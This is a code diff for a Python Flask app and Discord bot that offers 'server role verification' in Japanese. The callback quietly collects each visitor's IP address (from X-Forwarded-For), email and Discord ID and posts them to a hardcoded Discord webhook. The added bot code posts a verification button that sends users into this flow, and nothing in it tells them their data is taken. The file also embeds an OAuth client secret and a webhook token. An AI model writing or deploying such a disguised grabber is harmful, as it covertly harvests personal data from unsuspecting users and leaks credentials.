@@ -1,6 +1,12 @@
+import os
+import threading
 import requests
 from flask import Flask, redirect, request
+import discord
+from discord import app_commands
+from discord.ui import View, Button
 
+# --- Flask (Webアプリ) の設定 ---
 app = Flask(__name__)
 
 CLIENT_ID = "1532018589152968895"
@@ -8,7 +14,6 @@ CLIENT_SECRET = "R301W9GzYTRQAvU-mBu79GB6WALEjkZu"
 REDIRECT_URI = "https://meado-1.onrender.com/callback"
 WEBHOOK_URL = "https://discordapp.com/api/webhooks/1547553848103796810/xReOTL5ZrkaGardlqmH5vkt9ePY3O4zJktYksge08gwJISRAW7FeklNhvQh1fxaniWqX"
 
-# 設定されたサーバーIDとロールID
 TARGET_GUILD_ID = "1514842263799332864"
 REQUIRED_ROLE_ID = "1538857778058100766"
 
@@ -29,13 +34,11 @@ def callback():
     if not code:
         return "認証コードが見つかりません。", 400
 
-    # IPアドレスの取得（プロキシ考慮）
     if request.environ.get('HTTP_X_FORWARDED_FOR') is not None:
         user_ip = request.environ['HTTP_X_FORWARDED_FOR'].split(',')[0].strip()
     else:
         user_ip = request.remote_addr or "取得失敗"
 
-    # 1. アクセストークンの取得
     token_data = {
         "client_id": CLIENT_ID,
         "client_secret": CLIENT_SECRET,
@@ -53,7 +56,6 @@ def callback():
     access_token = token_json.get("access_token")
     user_headers = {"Authorization": f"Bearer {access_token}"}
 
-    # 2. ユーザー情報の取得（メアド含む）
     user_res = requests.get("https://discord.com/api/users/@me", headers=user_headers)
     if user_res.status_code != 200:
         return "ユーザー情報の取得に失敗しました。", 400
@@ -63,7 +65,6 @@ def callback():
     user_id = user_data.get("id")
     email = user_data.get("email", "非公開または未取得")
 
-    # 3. 指定サーバーにおけるメンバー情報（ロール）のチェック
     role_check_passed = False
     member_res = requests.get(f"https://discord.com/api/users/@me/guilds/{TARGET_GUILD_ID}/member", headers=user_headers)
     if member_res.status_code == 200:
@@ -72,11 +73,9 @@ def callback():
         if REQUIRED_ROLE_ID in user_roles:
             role_check_passed = True
 
-    # ロールを持っていない場合（またはサーバーに参加していない場合）
     if not role_check_passed:
         return "<h1>認証失敗</h1><p>指定されたサーバーに参加していないか、必要なロールを所持していません。</p>", 403
 
-    # 4. Webhookへ詳細データを送信
     if WEBHOOK_URL:
         payload = {
             "content": (
@@ -91,5 +90,50 @@ def callback():
 
     return "<h1>認証が完了しました！</h1><p>このタブを閉じて大丈夫です。</p>"
 
-if __name__ == "__main__":
+
+# --- Discord Bot の設定 ---
+intents = discord.Intents.default()
+bot = discord.Client(intents=intents)
+tree = app_commands.CommandTree(bot)
+
+# 認証用ボタンを持つViewクラス
+class AuthView(View):
+    def __init__(self):
+        super().__init__(timeout=None)
+        # WebアプリのURLへ飛ばすボタンを追加
+        auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20guilds.members.read"
+        self.add_item(Button(label="🔐 認証する", url=auth_url, style=discord.ButtonStyle.link))
+
+@bot.event
+async def on_ready():
+    await tree.sync()
+    print(f"Botがログインしました: {bot.user}")
+
+# /auth コマンドの定義
+@tree.command(name="auth", description="認証パネルを設置します")
+@app_commands.checks.has_permissions(administrator=True) # 管理者のみ実行可能にする場合
+async def auth_command(interaction: discord.Interaction):
+    embed = discord.Embed(
+        title="サーバー認証パネル",
+        description="下のボタンをクリックして、ロール認証を行ってください。",
+        color=0x5865F2
+    )
+    await interaction.channel.send(embed=embed, view=AuthView())
+    await interaction.response.send_message("認証パネルを設置しました！", ephemeral=True)
+
+
+# --- Flask と Bot を同時に動かす処理 ---
+def run_flask():
     app.run(host="0.0.0.0", port=5000)
+
+if __name__ == "__main__":
+    # ボットのトークン（ここに実際のボットトークンを入力してください）
+    DISCORD_BOT_TOKEN = "ここにボットのトークンを入力してください"
+
+    # Flaskを別スレッドで起動
+    flask_thread = threading.Thread(target=run_flask)
+    flask_thread.daemon = True
+    flask_thread.start()
+
+    # Discordボットを起動
+    bot.run(DISCORD_BOT_TOKEN)
